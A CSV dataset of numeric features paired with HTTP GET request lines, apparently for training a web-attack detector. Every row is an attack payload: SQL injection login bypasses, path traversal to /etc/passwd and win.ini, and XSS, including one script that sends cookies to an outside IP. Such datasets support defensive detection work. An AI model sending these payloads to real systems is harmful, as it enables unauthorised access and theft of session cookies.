32,1,200,1049,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2779,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4232,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6875,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,4507,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1714,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1657,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7067,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3766,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3494,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1023,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,1929,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3768,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5659,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,2823,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6828,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,6287,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,3746,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,5373,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
32,1,200,7904,7,12,6,2,1,GET login/?id=admin' -- HTTP/1.1
35,1,200,4571,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1463,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6096,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6457,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6085,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7322,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,4712,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,5013,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6175,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,4645,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,4634,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1082,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6716,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2450,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,4185,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1145,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7841,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2702,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6368,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6187,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,6258,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7835,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
104,1,200,7893,7,56,19,6,2,GET /?search=<script>window.location='http://182.111.110.133/?cookie='+document.cookie</script> HTTP/1.1
48,1,200,5153,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,6884,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,7214,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,4660,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,2830,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,2699,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,5500,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,1639,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,7858,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,7139,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,1038,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
59,1,200,5783,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,3571,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,2387,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,6495,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,6995,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,5431,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,5200,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,6801,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,1185,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,2335,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
59,1,200,2288,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6637,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6936,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,1697,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2620,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,5909,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,4815,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,5020,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6643,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6839,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,1421,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,3789,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,3804,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6409,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,6045,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,7496,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,2803,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
58,1,200,4051,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
53,2,200,5726,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5967,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3707,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7412,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7443,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5515,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4496,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3307,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7276,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2192,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4076,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5887,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3984,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2102,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2025,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6308,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3423,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5609,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4170,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3668,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5796,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7677,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1651,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3347,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2612,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2964,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5088,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7791,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7420,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7903,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7279,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3211,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7382,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1938,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3828,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4390,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3619,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2531,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3584,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6248,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7622,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6176,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7925,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6244,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3228,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5055,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6241,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7384,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3945,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1006,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7914,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4853,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5775,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7748,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2386,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7247,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4694,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2331,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6247,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3303,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2791,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6978,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7810,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2919,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6624,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4072,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4664,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3019,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1919,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6814,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3171,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1683,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4429,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7149,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2044,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7750,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3564,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3392,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4441,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4090,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4243,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2280,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4330,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,1,200,2809,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,3859,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,5393,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,2607,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,7304,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,4285,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,6651,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,3716,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,1659,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,3009,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,3092,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,3927,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,2339,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
53,1,200,4434,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
76,1,200,4821,7,35,14,5,2,GET /?p=<script>window.location.href="http://254.5.207.56"</script> HTTP/1.1
46,1,200,6940,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,5596,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,7678,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,5624,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,1444,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,5944,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,4067,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,1164,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,4455,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,1768,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,1533,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
46,1,200,1713,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
48,1,200,2831,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,1049,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2080,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5323,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5045,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,4635,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5067,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2596,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,7370,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,1288,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5370,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,7229,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,2452,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,7944,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5639,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5719,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,6304,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,7186,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,5540,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,3614,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
75,2,200,7060,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4400,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5193,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2084,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5989,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1317,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1346,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2122,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3901,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7312,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4912,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1812,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3196,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6910,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6680,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2539,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
